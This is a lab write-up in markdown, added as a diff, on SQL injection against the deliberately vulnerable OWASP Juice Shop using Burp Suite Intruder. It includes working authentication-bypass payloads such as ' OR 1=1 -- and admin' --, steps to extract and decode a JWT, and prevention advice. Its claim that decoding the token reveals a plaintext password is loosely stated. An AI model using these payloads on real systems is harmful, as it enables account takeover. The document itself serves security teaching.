@@ -1,0 +1,528 @@
+# AIM
+
+To perform and analyze SQL Injection attacks using Burp Suite on the intentionally vulnerable OWASP Juice Shop application and understand how improper input validation can lead to authentication bypass and unauthorized access.
+
+---
+
+# REQUIREMENTS
+
+* Kali Linux
+* Burp Suite
+* Firefox Browser
+* Docker
+* OWASP Juice Shop
+* Internet Connection
+
+---
+
+# PROCEDURE
+
+# Part A: Setting Up OWASP Juice Shop
+
+## Step 1: Open Kali Linux
+
+1. Start the Kali Linux virtual machine.
+2. Log in to the system.
+
+---
+
+## Step 2: Open Terminal
+
+1. Open Terminal in Kali Linux.
+
+---
+
+## Step 3: Update Package Repository
+
+Execute:
+
+```bash id="b9k5ea"
+sudo apt update
+```
+
+Wait until update completes successfully.
+
+---
+
+## Step 4: Install Docker
+
+Execute:
+
+```bash id="pygkh6"
+sudo apt install docker.io -y
+```
+
+This installs Docker in Kali Linux.
+
+---
+
+## Step 5: Start Docker Service
+
+Execute the following commands one by one:
+
+```bash id="3h7l0x"
+sudo systemctl start docker
+```
+
+```bash id="jlwmg5"
+sudo systemctl enable docker
+```
+
+---
+
+## Step 6: Verify Docker Installation
+
+Execute:
+
+```bash id="smtnkj"
+docker --version
+```
+
+Docker version information should appear.
+
+---
+
+## Step 7: Add User to Docker Group
+
+Execute:
+
+```bash id="gx4crx"
+sudo usermod -aG docker $USER
+```
+
+---
+
+## Step 8: Restart Session
+
+Execute:
+
+```bash id="jlwmgk"
+reboot
+```
+
+OR logout and login again.
+
+This applies Docker group permissions.
+
+---
+
+## Step 9: Test Docker
+
+After restart, execute:
+
+```bash id="mjlwm1"
+docker run hello-world
+```
+
+If Docker is working correctly, a success message appears.
+
+---
+
+## Step 10: Download OWASP Juice Shop
+
+Execute:
+
+```bash id="3d8mce"
+docker pull bkimminich/juice-shop
+```
+
+Wait for the download to complete.
+
+---
+
+## Step 11: Run OWASP Juice Shop
+
+Execute:
+
+```bash id="vjlwm7"
+docker run -d -p 3000:3000 bkimminich/juice-shop
+```
+
+This starts Juice Shop on port `3000`.
+
+---
+
+## Step 12: Open Juice Shop
+
+1. Open Firefox browser.
+2. Enter:
+
+```text id="0t1y3r"
+http://localhost:3000
+```
+
+3. Verify that OWASP Juice Shop opens successfully.
+
+---
+
+# Part B: Configuring Burp Suite
+
+## Step 13: Open Burp Suite
+
+1. Open Terminal.
+2. Execute:
+
+```bash id="sjlwm2"
+burpsuite
+```
+
+3. Burp Suite opens.
+
+---
+
+## Step 14: Create Temporary Project
+
+1. Select:
+
+   ```text id="jlwm3v"
+   Temporary Project
+   ```
+2. Click:
+
+   ```text id="r6x2hq"
+   Start Burp
+   ```
+
+---
+
+## Step 15: Open Burp Browser
+
+1. Go to:
+
+   ```text id="3vjlwm"
+   Proxy tab
+   ```
+2. Click:
+
+   ```text id="jlwm4z"
+   Open Browser
+   ```
+
+The browser automatically uses Burp proxy settings.
+
+---
+
+# Part C: Capturing Login Request
+
+## Step 16: Open Juice Shop Login Page
+
+In Burp Browser, open:
+
+```text id="jlwm5m"
+http://localhost:3000/#/login
+```
+
+OR
+
+```text id="6hjv0m"
+https://juice-shop.herokuapp.com/#/login
+```
+
+---
+
+## Step 17: Enter Dummy Login Credentials
+
+Enter:
+
+```text id="njlwm6"
+Email: admin
+Password: password
+```
+
+Click:
+
+```text id="f5jv7q"
+Login
+```
+
+---
+
+## Step 18: Capture Request in Burp
+
+1. Return to Burp Suite.
+2. Open:
+
+   ```text id="h8m4rt"
+   HTTP History
+   ```
+3. Locate request:
+
+   ```text id="1jlwm7"
+   /rest/user/login
+   ```
+
+This is the login API request.
+
+---
+
+# Part D: SQL Injection using Intruder
+
+## Step 19: Send Request to Intruder
+
+1. Right-click the request:
+
+   ```text
+   /rest/user/login
+   ```
+2. Click:
+
+   ```text id="5qg0vl"
+   Send to Intruder
+   ```
+
+---
+
+## Step 20: Configure Attack Positions
+
+1. Open:
+
+   ```text id="8jlwm9"
+   Intruder → Positions
+   ```
+
+2. Click:
+
+   ```text id="jlwm0k"
+   Clear §
+   ```
+
+3. Select the email value:
+
+   ```json id="jlwm1n"
+   "email":"admin"
+   ```
+
+4. Click:
+
+   ```text id="jlwm2p"
+   Add §
+   ```
+
+It becomes:
+
+```json id="jlwm3q"
+"email":"§admin§"
+```
+
+---
+
+## Step 21: Add SQL Injection Payloads
+
+1. Open:
+
+   ```text id="jlwm4r"
+   Payloads tab
+   ```
+
+2. Add SQL Injection payloads manually.
+
+Example payloads:
+
+```sql id="jlwm5s"
+' OR 1=1 --
+```
+
+```sql id="jlwm6t"
+' OR '1'='1
+```
+
+```sql id="jlwm7u"
+admin' --
+```
+
+```sql id="jlwm8v"
+' OR 1=1#
+```
+
+```sql id="jlwm9w"
+' OR ''='
+```
+
+These payloads test authentication bypass vulnerabilities.
+
+---
+
+## Step 22: Disable URL Encoding
+
+1. Locate option:
+
+   ```text id="jlwm0x"
+   URL Encode these characters
+   ```
+2. Uncheck the option.
+
+This prevents Burp from modifying SQL payload characters.
+
+---
+
+## Step 23: Start Intruder Attack
+
+Click:
+
+```text id="jlwm1y"
+Start Attack
+```
+
+Burp Suite now automatically tests all payloads.
+
+---
+
+# Part E: Analyze Results
+
+## Step 24: Observe Responses
+
+Analyze response results carefully.
+
+Important indicators:
+
+* Status Code `200` → Successful login
+* Other status codes → Failed attempts
+
+Observation:
+
+* Payloads returning `200 OK` indicate successful SQL Injection.
+
+---
+
+## Step 25: Extract Authentication Token
+
+1. Click the successful `200` response.
+
+2. Open:
+
+   ```text id="jlwm2z"
+   Response tab
+   ```
+
+3. Locate:
+
+   ```text id="3f9xqk"
+   authentication token
+   ```
+
+4. Copy the JWT token.
+
+---
+
+## Step 26: Decode Token
+
+1. Open:
+
+   ```text id="jlwm3a"
+   Decoder tab
+   ```
+2. Paste the token.
+3. Select:
+
+   ```text id="jlwm4b"
+   Decode as → Base64
+   ```
+
+Observation:
+
+* User information becomes visible.
+
+---
+
+## Step 27: Identify Extracted Credentials
+
+Decoded data may reveal:
+
+```text id="jlwm5c"
+email: admin@juice-sh.op
+password: admin123
+```
+
+---
+
+## Step 28: Login Using Extracted Credentials
+
+1. Return to Juice Shop login page.
+2. Enter extracted credentials.
+3. Click Login.
+
+Observation:
+
+* Successful administrator login achieved.
+
+---
+
+# TYPES OF SQL INJECTION USED
+
+## 1. Authentication Bypass
+
+Example:
+
+```sql id="jlwm6d"
+' OR 1=1 --
+```
+
+---
+
+## 2. Boolean-Based SQL Injection
+
+Examples:
+
+```sql id="jlwm7e"
+' AND 1=1 --
+```
+
+```sql id="jlwm8f"
+' AND 1=2 --
+```
+
+---
+
+## 3. Error-Based SQL Injection
+
+Example:
+
+```sql id="jlwm9g"
+'
+```
+
+---
+
+## 4. Automated SQL Injection
+
+Performed using Burp Suite Intruder to test multiple payloads automatically.
+
+---
+
+# OBSERVATIONS
+
+1. OWASP Juice Shop was successfully deployed using Docker.
+2. Burp Suite successfully intercepted login requests.
+3. The `/rest/user/login` API request was vulnerable to SQL Injection.
+4. Multiple payloads were tested automatically using Intruder.
+5. Some payloads returned HTTP Status Code `200`, indicating successful authentication bypass.
+6. Authentication tokens were extracted from server responses.
+7. Decoded tokens revealed sensitive user information.
+8. SQL Injection allowed unauthorized access to administrator accounts.
+9. The experiment demonstrated the dangers of improper input validation.
+
+---
+
+# RESULT
+
+The SQL Injection vulnerability in OWASP Juice Shop was successfully identified and exploited using Burp Suite Intruder. Authentication bypass was achieved using SQL Injection payloads, and sensitive authentication data was extracted from the application response.
+
+---
+
+# CONCLUSION
+
+This experiment demonstrated how attackers exploit SQL Injection vulnerabilities in web applications using Burp Suite. Improper input validation allowed authentication bypass and exposure of sensitive data. The experiment highlights the importance of secure coding practices, prepared statements, and input sanitization to prevent SQL Injection attacks.
+
+---
+
+# PREVENTION TECHNIQUES
+
+1. Prepared Statements (Parameterized Queries)
+2. Input Validation and Sanitization
+3. Use of ORM Frameworks
+4. Web Application Firewalls (WAF)
+5. Least Privilege Database Access
+6. Secure Error Handling
+7. Regular Security Testing
+
+---
